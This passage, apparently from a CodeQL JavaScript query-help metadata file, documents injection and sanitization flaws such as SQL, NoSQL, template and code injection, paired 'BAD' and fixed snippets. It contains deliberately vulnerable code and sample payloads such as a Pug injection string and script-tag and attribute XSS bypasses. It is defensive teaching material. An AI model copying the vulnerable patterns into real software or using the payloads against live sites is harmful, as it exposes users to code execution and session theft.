      In the following example, assume the function `handler` is an HTTP request handler in a web application, whose parameter `req` contains the request object.

      The handler constructs an SQL query string from user input and executes it as a database query using the `pg` library. The user input may contain quote characters, so this code is vulnerable to a SQL injection attack.


      ```javascript
      const app = require("express")(),
            pg = require("pg"),
            pool = new pg.Pool(config);

      app.get("search", function handler(req, res) {
        // BAD: the category might have SQL special characters in it
        var query1 =
          "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='" +
          req.params.category +
          "' ORDER BY PRICE";
        pool.query(query1, [], function(err, results) {
          // process results
        });
      });

      ```
      To fix this vulnerability, we can use query parameters to embed the user input into the query string. In this example, we use the API offered by the `pg` Postgres database connector library, but other libraries offer similar features. This version is immune to injection attacks.


      ```javascript
      const app = require("express")(),
            pg = require("pg"),
            pool = new pg.Pool(config);

      app.get("search", function handler(req, res) {
        // GOOD: use parameters
        var query2 =
          "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=$1 ORDER BY PRICE";
        pool.query(query2, [req.params.category], function(err, results) {
          // process results
        });
      });

      ```
      Alternatively, we can use a library like `sqlstring` to escape the user input before embedding it into the query string:


      ```javascript
      const app = require("express")(),
            pg = require("pg"),
            SqlString = require('sqlstring'),
            pool = new pg.Pool(config);

      app.get("search", function handler(req, res) {
        // GOOD: the category is escaped using mysql.escape
        var query1 =
          "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='" +
          SqlString.escape(req.params.category) +
          "' ORDER BY PRICE";
        pool.query(query1, [], function(err, results) {
          // process results
        });
      });

      ```

      ## Example
      In the following example, an express handler attempts to delete a single document from a MongoDB collection. The document to be deleted is identified by its `_id` field, which is constructed from user input. The user input may contain a query object, so this code is vulnerable to a NoSQL injection attack.


      ```javascript
      const express = require("express");
      const mongoose = require("mongoose");
      const Todo = mongoose.model(
        "Todo",
        new mongoose.Schema({ text: { type: String } }, { timestamps: true })
      );

      const app = express();
      app.use(express.json());
      app.use(express.urlencoded({ extended: false }));

      app.delete("/api/delete", async (req, res) => {
        let id = req.body.id;

        await Todo.deleteOne({ _id: id }); // BAD: id might be an object with special properties

        res.json({ status: "ok" });
      });

      ```
      To fix this vulnerability, we can use the `$eq` operator to ensure that the user input is interpreted as a literal value and not as a query object:


      ```javascript
      app.delete("/api/delete", async (req, res) => {
        let id = req.body.id;
        await Todo.deleteOne({ _id: { $eq: id } }); // GOOD: using $eq operator for the comparison

        res.json({ status: "ok" });
      });
      ```
      Alternatively check that the user input is a literal value and not a query object before using it:


      ```javascript
      app.delete("/api/delete", async (req, res) => {
        let id = req.body.id;
        if (typeof id !== "string") {
          res.status(400).json({ status: "error" });
          return;
        }
        await Todo.deleteOne({ _id: id }); // GOOD: id is guaranteed to be a string

        res.json({ status: "ok" });
      });

      ```

      ## References
      * Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).
      * MongoDB: [$eq operator](https://docs.mongodb.com/manual/reference/operator/query/eq).
      * OWASP: [NoSQL injection](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf).
      * Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).
      * Common Weakness Enumeration: [CWE-90](https://cwe.mitre.org/data/definitions/90.html).
      * Common Weakness Enumeration: [CWE-943](https://cwe.mitre.org/data/definitions/943.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-094/CodeInjection.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-094/CodeInjection.bqrs
    metadata:
      name: Code injection
      description: |-
        Interpreting unsanitized user input as code allows a malicious user arbitrary
                      code execution.
      kind: path-problem
      problem.severity: error
      security-severity: 9.3
      precision: high
      id: js/code-injection
      tags: |-
        security
               external/cwe/cwe-094
               external/cwe/cwe-095
               external/cwe/cwe-079
               external/cwe/cwe-116
    queryHelp: |
      # Code injection
      Directly evaluating user input (for example, an HTTP request parameter) as code without properly sanitizing the input first allows an attacker arbitrary code execution. This can occur when user input is treated as JavaScript, or passed to a framework which interprets it as an expression to be evaluated. Examples include AngularJS expressions or JQuery selectors.


      ## Recommendation
      Avoid including user input in any expression which may be dynamically evaluated. If user input must be included, use context-specific escaping before including it. It is important that the correct escaping is used for the type of evaluation that will occur.


      ## Example
      The following example shows part of the page URL being evaluated as JavaScript code. This allows an attacker to provide JavaScript within the URL. If an attacker can persuade a user to click on a link to such a URL, the attacker can evaluate arbitrary JavaScript in the browser of the user to, for example, steal cookies containing session information.


      ```javascript
      eval(document.location.href.substring(document.location.href.indexOf("default=")+8))

      ```
      The following example shows a Pug template being constructed from user input, allowing attackers to run arbitrary code via a payload such as `#{global.process.exit(1)}`.


      ```javascript
      const express = require('express')
      var pug = require('pug');
      const app = express()

      app.post('/', (req, res) => {
          var input = req.query.username;
          var template = `
      doctype
      html
      head
          title= 'Hello world'
      body
          form(action='/' method='post')
              input#name.form-control(type='text)
              button.btn.btn-primary(type='submit') Submit
          p Hello `+ input
          var fn = pug.compile(template);
          var html = fn();
          res.send(html);
      })

      ```
      Below is an example of how to use a template engine without any risk of template injection. The user input is included via an interpolation expression `#{username}` whose value is provided as an option to the template, instead of being part of the template string itself:


      ```javascript
      const express = require('express')
      var pug = require('pug');
      const app = express()

      app.post('/', (req, res) => {
          var input = req.query.username;
          var template = `
      doctype
      html
      head
          title= 'Hello world'
      body
          form(action='/' method='post')
              input#name.form-control(type='text)
              button.btn.btn-primary(type='submit') Submit
          p Hello #{username}`
          var fn = pug.compile(template);
          var html = fn({username: input});
          res.send(html);
      })

      ```

      ## References
      * OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).
      * Wikipedia: [Code Injection](https://en.wikipedia.org/wiki/Code_injection).
      * PortSwigger Research Blog: [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection).
      * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
      * Common Weakness Enumeration: [CWE-95](https://cwe.mitre.org/data/definitions/95.html).
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-094/ImproperCodeSanitization.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-094/ImproperCodeSanitization.bqrs
    metadata:
      name: Improper code sanitization
      description: Escaping code as HTML does not provide protection against code injection.
      kind: path-problem
      problem.severity: error
      security-severity: 6.1
      precision: high
      id: js/bad-code-sanitization
      tags: |-
        security
               external/cwe/cwe-094
               external/cwe/cwe-079
               external/cwe/cwe-116
    queryHelp: |
      # Improper code sanitization
      Using string concatenation to construct JavaScript code can be error-prone, or in the worst case, enable code injection if an input is constructed by an attacker.


      ## Recommendation
      If using `JSON.stringify` or an HTML sanitizer to sanitize a string inserted into JavaScript code, then make sure to perform additional sanitization or remove potentially dangerous characters.


      ## Example
      The example below constructs a function that assigns the number 42 to the property `key` on an object `obj`. However, if `key` contains `</script>`, then the generated code will break out of a `</script>` if inserted into a `</script>` tag.


      ```javascript
      function createObjectWrite() {
          const assignment = `obj[${JSON.stringify(key)}]=42`;
          return `(function(){${assignment}})` // NOT OK
      }
      ```
      The issue has been fixed by escaping potentially dangerous characters, as shown below.


      ```javascript
      const charMap = {
          '<': '\\u003C',
          '>' : '\\u003E',
          '/': '\\u002F',
          '\\': '\\\\',
          '\b': '\\b',
          '\f': '\\f',
          '\n': '\\n',
          '\r': '\\r',
          '\t': '\\t',
          '\0': '\\0',
          '\u2028': '\\u2028',
          '\u2029': '\\u2029'
      };

      function escapeUnsafeChars(str) {
          return str.replace(/[<>\b\f\n\r\t\0\u2028\u2029]/g, x => charMap[x])
      }

      function createObjectWrite() {
          const assignment = `obj[${escapeUnsafeChars(JSON.stringify(key))}]=42`;
          return `(function(){${assignment}})` // OK
      }
      ```

      ## References
      * OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).
      * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-094/UnsafeCodeConstruction.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-094/UnsafeCodeConstruction.bqrs
    metadata:
      name: Unsafe code constructed from library input
      description: |-
        Using externally controlled strings to construct code may allow a malicious
                      user to execute arbitrary code.
      kind: path-problem
      problem.severity: warning
      security-severity: 6.1
      precision: medium
      id: js/unsafe-code-construction
      tags: |-
        security
               external/cwe/cwe-094
               external/cwe/cwe-079
               external/cwe/cwe-116
    queryHelp: |
      # Unsafe code constructed from library input
      When a library function dynamically constructs code in a potentially unsafe way, then it's important to document to clients of the library that the function should only be used with trusted inputs. If the function is not documented as being potentially unsafe, then a client may incorrectly use inputs containing unsafe code fragments, and thereby leave the client vulnerable to code-injection attacks.


      ## Recommendation
      Properly document library functions that construct code from unsanitized inputs, or avoid constructing code in the first place.


      ## Example
      The following example shows two methods implemented using \`eval\`: a simple deserialization routine and a getter method. If untrusted inputs are used with these methods, then an attacker might be able to execute arbitrary code on the system.


      ```javascript
      export function unsafeDeserialize(value) {
        return eval(`(${value})`);
      }

      export function unsafeGetter(obj, path) {
          return eval(`obj.${path}`);
      }

      ```
      To avoid this problem, either properly document that the function is potentially unsafe, or use an alternative solution such as \`JSON.parse\` or another library, like in the examples below, that does not allow arbitrary code to be executed.


      ```javascript
      export function safeDeserialize(value) {
        return JSON.parse(value);
      }

      const _ = require("lodash");
      export function safeGetter(object, path) {
        return _.get(object, path);
      }

      ```

      ## References
      * OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).
      * Wikipedia: [Code Injection](https://en.wikipedia.org/wiki/Code_injection).
      * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-094/UnsafeDynamicMethodAccess.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-094/UnsafeDynamicMethodAccess.bqrs
    metadata:
      name: Unsafe dynamic method access
      description:
        Invoking user-controlled methods on certain objects can lead to remote
        code execution.
      kind: path-problem
      problem.severity: error
      security-severity: 9.3
      precision: high
      id: js/unsafe-dynamic-method-access
      tags: |-
        security
               external/cwe/cwe-094
    queryHelp:
      "# Unsafe dynamic method access\nCalling a user-controlled method on\
      \ certain objects can lead to invocation of unsafe functions, such as `eval` or\
      \ the `Function` constructor. In particular, the global object contains the `eval`\
      \ function, and any function object contains the `Function` constructor in its\
      \ `constructor` property.\n\n\n## Recommendation\nAvoid invoking user-controlled\
      \ methods on the global object or on any function object. Whitelist the permitted\
      \ method names or change the type of object the methods are stored on.\n\n\n##\
      \ Example\nIn the following example, a message from the document's parent frame\
      \ can invoke the `play` or `pause` method. However, it can also invoke `eval`.\
      \ A malicious website could embed the page in an iframe and execute arbitrary\
      \ code by sending a message with the name `eval`.\n\n\n```javascript\n// API methods\n\
      function play(data) {\n  // ...\n}\nfunction pause(data) {\n  // ...\n}\n\nwindow.addEventListener(\"\
      message\", (ev) => {\n    let message = JSON.parse(ev.data);\n\n    // Let the\
      \ parent frame call the 'play' or 'pause' function \n    window[message.name](message.payload);\n\
      });\n\n```\nInstead of storing the API methods in the global scope, put them in\
      \ an API object or Map. It is also good practice to prevent invocation of inherited\
      \ methods like `toString` and `valueOf`.\n\n\n```javascript\n// API methods\n\
      let api = {\n  play: function(data) {\n    // ...\n  },\n  pause: function(data)\
      \ {\n    // ...\n  }\n};\n\nwindow.addEventListener(\"message\", (ev) => {\n \
      \   let message = JSON.parse(ev.data);\n\n    // Let the parent frame call the\
      \ 'play' or 'pause' function\n    if (!api.hasOwnProperty(message.name)) {\n \
      \     return;\n    }\n    api[message.name](message.payload);\n});\n\n```\n\n\
      ## References\n* OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).\n\
      * MDN: [Global functions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects#Function_properties).\n\
      * MDN: [Function constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function).\n\
      * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-1004/ClientExposedCookie.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-1004/ClientExposedCookie.bqrs
    metadata:
      name: Sensitive server cookie exposed to the client
      description:
        Sensitive cookies set by a server can be read by the client if the
        `httpOnly` flag is not set.
      kind: problem
      problem.severity: warning
      security-severity: 5.0
      precision: high
      id: js/client-exposed-cookie
      tags: |-
        security
               external/cwe/cwe-1004
    queryHelp: |
      # Sensitive server cookie exposed to the client
      Authentication cookies stored by a server can be accessed by a client if the `httpOnly` flag is not set.

      An attacker that manages a cross-site scripting (XSS) attack can read the cookie and hijack the session.


      ## Recommendation
      Set the `httpOnly` flag on all cookies that are not needed by the client.


      ## Example
      The following example stores an authentication token in a cookie that can be viewed by the client.


      ```javascript
      const http = require('http');

      const server = http.createServer((req, res) => {
          res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}`);
          res.writeHead(200, { 'Content-Type': 'text/html' });
          res.end('<h2>Hello world</h2>');
      });
      ```
      To force the cookie to be transmitted using SSL, set the `secure` attribute on the cookie.


      ```javascript
      const http = require('http');

      const server = http.createServer((req, res) => {
          res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}; secure; httpOnly`);
          res.writeHead(200, { 'Content-Type': 'text/html' });
          res.end('<h2>Hello world</h2>');
      });
      ```

      ## References
      * ExpressJS: [Use cookies securely](https://expressjs.com/en/advanced/best-practice-security.html#use-cookies-securely).
      * OWASP: [Set cookie flags appropriately](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html#set-cookie-flags-appropriately).
      * Mozilla: [Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie).
      * Common Weakness Enumeration: [CWE-1004](https://cwe.mitre.org/data/definitions/1004.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-116/BadTagFilter.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/BadTagFilter.bqrs
    metadata:
      name: Bad HTML filtering regexp
      description:
        "Matching HTML tags using regular expressions is hard to do right,\
        \ and can easily lead to security issues."
      kind: problem
      problem.severity: warning
      security-severity: 7.8
      precision: high
      id: js/bad-tag-filter
      tags: |-
        correctness
               security
               external/cwe/cwe-020
               external/cwe/cwe-080
               external/cwe/cwe-116
               external/cwe/cwe-184
               external/cwe/cwe-185
               external/cwe/cwe-186
    queryHelp: |
      # Bad HTML filtering regexp
      It is possible to match some single HTML tags using regular expressions (parsing general HTML using regular expressions is impossible). However, if the regular expression is not written well it might be possible to circumvent it, which can lead to cross-site scripting or other security issues.

      Some of these mistakes are caused by browsers having very forgiving HTML parsers, and will often render invalid HTML containing syntax errors. Regular expressions that attempt to match HTML should also recognize tags containing such syntax errors.


      ## Recommendation
      Use a well-tested sanitization or parser library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation.


      ## Example
      The following example attempts to filters out all `<script>` tags.


      ```javascript
      function filterScript(html) {
          var scriptRegex = /<script\b[^>]*>([\s\S]*?)<\/script>/gi;
          var match;
          while ((match = scriptRegex.exec(html)) !== null) {
              html = html.replace(match[0], match[1]);
          }
          return html;
      }

      ```
      The above sanitizer does not filter out all `<script>` tags. Browsers will not only accept `</script>` as script end tags, but also tags such as `</script foo="bar">` even though it is a parser error. This means that an attack string such as `<script>alert(1)</script foo="bar">` will not be filtered by the function, and `alert(1)` will be executed by a browser if the string is rendered as HTML.

      Other corner cases include that HTML comments can end with `--!>`, and that HTML tag names can contain upper case characters.


      ## References
      * Securitum: [The Curious Case of Copy &amp; Paste](https://research.securitum.com/the-curious-case-of-copy-paste/).
      * stackoverflow.com: [You can't parse \[X\]HTML with regex](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags#answer-1732454).
      * HTML Standard: [Comment end bang state](https://html.spec.whatwg.org/multipage/parsing.html#comment-end-bang-state).
      * stackoverflow.com: [Why aren't browsers strict about HTML?](https://stackoverflow.com/questions/25559999/why-arent-browsers-strict-about-html).
      * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
      * Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
      * Common Weakness Enumeration: [CWE-184](https://cwe.mitre.org/data/definitions/184.html).
      * Common Weakness Enumeration: [CWE-185](https://cwe.mitre.org/data/definitions/185.html).
      * Common Weakness Enumeration: [CWE-186](https://cwe.mitre.org/data/definitions/186.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-116/DoubleEscaping.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/DoubleEscaping.bqrs
    metadata:
      name: Double escaping or unescaping
      description: |-
        When escaping special characters using a meta-character like backslash or
                      ampersand, the meta-character has to be escaped first to avoid double-escaping,
                      and conversely it has to be unescaped last to avoid double-unescaping.
      kind: problem
      problem.severity: warning
      security-severity: 7.8
      precision: high
      id: js/double-escaping
      tags: |-
        correctness
               security
               external/cwe/cwe-116
               external/cwe/cwe-020
    queryHelp: |
      # Double escaping or unescaping
      Escaping meta-characters in untrusted input is an important technique for preventing injection attacks such as cross-site scripting. One particular example of this is HTML entity encoding, where HTML special characters are replaced by HTML character entities to prevent them from being interpreted as HTML markup. For example, the less-than character is encoded as `&lt;` and the double-quote character as `&quot;`. Other examples include backslash-escaping for including untrusted data in string literals and percent-encoding for URI components.

      The reverse process of replacing escape sequences with the characters they represent is known as unescaping.

      Note that the escape characters themselves (such as ampersand in the case of HTML encoding) play a special role during escaping and unescaping: they are themselves escaped, but also form part of the escaped representations of other characters. Hence care must be taken to avoid double escaping and unescaping: when escaping, the escape character must be escaped first, when unescaping it has to be unescaped last.

      If used in the context of sanitization, double unescaping may render the sanitization ineffective. Even if it is not used in a security-critical context, it may still result in confusing or garbled output.


      ## Recommendation
      Use a (well-tested) sanitization library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation. For URI encoding, you can use the standard `encodeURIComponent` and `decodeURIComponent` functions.

      Otherwise, make sure to always escape the escape character first, and unescape it last.


      ## Example
      The following example shows a pair of hand-written HTML encoding and decoding functions:


      ```javascript
      module.exports.encode = function(s) {
        return s.replace(/&/g, "&amp;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&apos;");
      };

      module.exports.decode = function(s) {
        return s.replace(/&amp;/g, "&")
                .replace(/&quot;/g, "\"")
                .replace(/&apos;/g, "'");
      };

      ```
      The encoding function correctly handles ampersand before the other characters. For example, the string `me & "you"` is encoded as `me &amp; &quot;you&quot;`, and the string `&quot;` is encoded as `&amp;quot;`.

      The decoding function, however, incorrectly decodes `&amp;` into `&` before handling the other characters. So while it correctly decodes the first example above, it decodes the second example (`&amp;quot;`) to `"` (a single double quote), which is not correct.

      Instead, the decoding function should decode the ampersand last:


      ```javascript
      module.exports.encode = function(s) {
        return s.replace(/&/g, "&amp;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&apos;");
      };

      module.exports.decode = function(s) {
        return s.replace(/&quot;/g, "\"")
                .replace(/&apos;/g, "'")
                .replace(/&amp;/g, "&");
      };

      ```

      ## References
      * OWASP Top 10: [A1 Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).
      * npm: [html-entities](https://www.npmjs.com/package/html-entities) package.
      * npm: [js-string-escape](https://www.npmjs.com/package/js-string-escape) package.
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
      * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-116/IncompleteHtmlAttributeSanitization.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/IncompleteHtmlAttributeSanitization.bqrs
    metadata:
      name: Incomplete HTML attribute sanitization
      description: |-
        Writing incompletely sanitized values to HTML
                      attribute strings can lead to a cross-site
                      scripting vulnerability.
      kind: path-problem
      problem.severity: warning
      security-severity: 6.1
      precision: high
      id: js/incomplete-html-attribute-sanitization
      tags: |-
        security
               external/cwe/cwe-079
               external/cwe/cwe-116
               external/cwe/cwe-020
    queryHelp:
      "# Incomplete HTML attribute sanitization\nSanitizing untrusted input\
      \ for HTML meta-characters is a common technique for preventing cross-site scripting\
      \ attacks. Usually, this is done by escaping `<`, `>`, `&` and `\"`. However,\
      \ the context in which the sanitized value is used decides the characters that\
      \ need to be sanitized.\n\nAs a consequence, some programs only sanitize `<` and\
      \ `>` since those are the most common dangerous characters. The lack of sanitization\
      \ for `\"` is problematic when an incompletely sanitized value is used as an HTML\
      \ attribute in a string that later is parsed as HTML.\n\n\n## Recommendation\n\
      Sanitize all relevant HTML meta-characters when constructing HTML dynamically,\
      \ and pay special attention to where the sanitized value is used.\n\nAn even safer\
      \ alternative is to design the application so that sanitization is not needed,\
      \ for instance by using HTML templates that are explicit about the values they\
      \ treat as HTML.\n\n\n## Example\nThe following example code writes part of an\
      \ HTTP request (which is controlled by the user) to an HTML attribute of the server\
      \ response. The user-controlled value is, however, not sanitized for `\"`. This\
      \ leaves the website vulnerable to cross-site scripting since an attacker can\
      \ use a string like `\" onclick=\"alert(42)` to inject JavaScript code into the\
      \ response.\n\n\n```javascript\nvar app = require('express')();\n\napp.get('/user/:id',\
      \ function(req, res) {\n\tlet id = req.params.id;\n\tid = id.replace(/<|>/g, \"\
      \"); // BAD\n\tlet userHtml = `<div data-id=\"${id}\">${getUserName(id) || \"\
      Unknown name\"}</div>`;\n\t// ...\n\tres.send(prefix + userHtml + suffix);\n});\n\
      \n```\nSanitizing the user-controlled data for `\"` helps prevent the vulnerability:\n\
      \n\n```javascript\nvar app = require('express')();\n\napp.get('/user/:id', function(req,\
      \ res) {\n\tlet id = req.params.id;\n\tid = id.replace(/<|>|&|\"/g, \"\"); //\
      \ GOOD\n\tlet userHtml = `<div data-id=\"${id}\">${getUserName(id) || \"Unknown\
      \ name\"}</div>`;\n\t// ...\n\tres.send(prefix + userHtml + suffix);\n});\n\n\
      ```\n\n## References\n* OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n\
      * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n\
      * OWASP [Types of Cross-Site](https://owasp.org/www-community/Types_of_Cross-Site_Scripting).\n\
      * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n\
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n\
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n\
      * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-116/IncompleteMultiCharacterSanitization.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/IncompleteMultiCharacterSanitization.bqrs
    metadata:
      name: Incomplete multi-character sanitization
      description:
        A sanitizer that removes a sequence of characters may reintroduce
        the dangerous sequence.
      kind: problem
      problem.severity: warning
      security-severity: 7.8
      precision: high
      id: js/incomplete-multi-character-sanitization
      tags: |-
        correctness
               security
               external/cwe/cwe-020
               external/cwe/cwe-080
               external/cwe/cwe-116
    queryHelp:
      "# Incomplete multi-character sanitization\nSanitizing untrusted input\
      \ is a common technique for preventing injection attacks and other security vulnerabilities.\
      \ Regular expressions are often used to perform this sanitization. However, when\
      \ the regular expression matches multiple consecutive characters, replacing it\
      \ just once can result in the unsafe text reappearing in the sanitized input.\n\
      \nAttackers can exploit this issue by crafting inputs that, when sanitized with\
      \ an ineffective regular expression, still contain malicious code or content.\
      \ This can lead to code execution, data exposure, or other vulnerabilities.\n\n\
      \n## Recommendation\nTo prevent this issue, it is highly recommended to use a\
      \ well-tested sanitization library whenever possible. These libraries are more\
      \ likely to handle corner cases and ensure effective sanitization.\n\nIf a library\
      \ is not an option, you can consider alternative strategies to fix the issue.\
      \ For example, applying the regular expression replacement repeatedly until no\
      \ more replacements can be performed, or rewriting the regular expression to match\
      \ single characters instead of the entire unsafe text.\n\n\n## Example\nConsider\
      \ the following JavaScript code that aims to remove all HTML comment start and\
      \ end tags:\n\n```javascript\n\nstr.replace(/<!--|--!?>/g, \"\");   \n\n```\n\
      Given the input string \"&lt;!&lt;!--- comment ---&gt;&gt;\", the output will\
      \ be \"&lt;!-- comment --&gt;\", which still contains an HTML comment.\n\nOne\
      \ possible fix for this issue is to apply the regular expression replacement repeatedly\
      \ until no more replacements can be performed. This ensures that the unsafe text\
      \ does not re-appear in the sanitized input, effectively removing all instances\
      \ of the targeted pattern:\n\n```javascript\n\nfunction removeHtmlComments(input)\
      \ {  \n  let previous;  \n  do {  \n    previous = input;  \n    input = input.replace(/<!--|--!?>/g,\
      \ \"\");  \n  } while (input !== previous);  \n  return input;  \n}  \n\n```\n\
      \n## Example\nAnother example is the following regular expression intended to\
      \ remove script tags:\n\n```javascript\n\nstr.replace(/<script\\b[^<]*(?:(?!<\\\
      /script>)<[^<]*)*<\\/script>/g, \"\");  \n\n```\nIf the input string is \"&lt;scrip&lt;script&gt;is\
      \ removed&lt;/script&gt;t&gt;alert(123)&lt;/script&gt;\", the output will be \"\
      &lt;script&gt;alert(123)&lt;/script&gt;\", which still contains a script tag.\n\
      \nA fix for this issue is to rewrite the regular expression to match single characters\
      \ (\"&lt;\" and \"&gt;\") instead of the entire unsafe text. This simplifies the\
      \ sanitization process and ensures that all potentially unsafe characters are\
      \ removed:\n\n```javascript\n\nfunction removeAllHtmlTags(input) {  \n  return\
      \ input.replace(/<|>/g, \"\");  \n}\n\n```\nAnother potential fix is to use the\
      \ popular `sanitize-html` npm library. It keeps most of the safe HTML tags while\
      \ removing all unsafe tags and attributes.\n\n```javascript\n\nconst sanitizeHtml\
      \ = require(\"sanitize-html\");\nfunction removeAllHtmlTags(input) {  \n  return\
      \ sanitizeHtml(input);  \n}\n\n```\n\n## Example\nLastly, consider a path sanitizer\
      \ using the regular expression `/\\.\\.\\//`:\n\n```javascript\n\nstr.replace(/\\\
      .\\.\\//g, \"\");  \n\n```\nThe regular expression attempts to strip out all occurences\
      \ of `/../` from `str`. This will not work as expected: for the string `/./.././`,\
      \ for example, it will remove the single occurrence of `/../` in the middle, but\
      \ the remainder of the string then becomes `/../`, which is another instance of\
      \ the substring we were trying to remove.\n\nA possible fix for this issue is\
      \ to use the \"sanitize-filename\" npm library for path sanitization. This library\
      \ is specifically designed to handle path sanitization, and should handle all\
      \ corner cases and ensure effective sanitization:\n\n```javascript\n\nconst sanitize\
      \ = require(\"sanitize-filename\");  \n  \nfunction sanitizePath(input) {  \n\
      \  return sanitize(input);  \n}  \n\n```\n\n## References\n* OWASP Top 10: [A1\
      \ Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).\n* Stack\
      \ Overflow: [Removing all script tags from HTML with JS regular expression](https://stackoverflow.com/questions/6659351/removing-all-script-tags-from-html-with-js-regular-expression).\n\
      * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n\
      * Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).\n\
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-116/IncompleteSanitization.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/IncompleteSanitization.bqrs
    metadata:
      name: Incomplete string escaping or encoding
      description: |-
        A string transformer that does not replace or escape all occurrences of a
                      meta-character may be ineffective.
      kind: problem
      problem.severity: warning
      security-severity: 7.8
      precision: high
      id: js/incomplete-sanitization
      tags: |-
        correctness
               security
               external/cwe/cwe-020
               external/cwe/cwe-080
               external/cwe/cwe-116
    queryHelp: |
      # Incomplete string escaping or encoding
      Sanitizing untrusted input is a common technique for preventing injection attacks such as SQL injection or cross-site scripting. Usually, this is done by escaping meta-characters such as quotes in a domain-specific way so that they are treated as normal characters.

      However, directly using the string `replace` method to perform escaping is notoriously error-prone. Common mistakes include only replacing the first occurrence of a meta-character, or backslash-escaping various meta-characters but not the backslash itself.

      In the former case, later meta-characters are left undisturbed and can be used to subvert the sanitization. In the latter case, preceding a meta-character with a backslash leads to the backslash being escaped, but the meta-character appearing un-escaped, which again makes the sanitization ineffective.

      Even if the escaped string is not used in a security-critical context, incomplete escaping may still have undesirable effects, such as badly rendered or confusing output.


      ## Recommendation
      Use a (well-tested) sanitization library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation.

      An even safer alternative is to design the application so that sanitization is not needed, for instance by using prepared statements for SQL queries.

      Otherwise, make sure to use a regular expression with the `g` flag to ensure that all occurrences are replaced, and remember to escape backslashes if applicable.


      ## Example
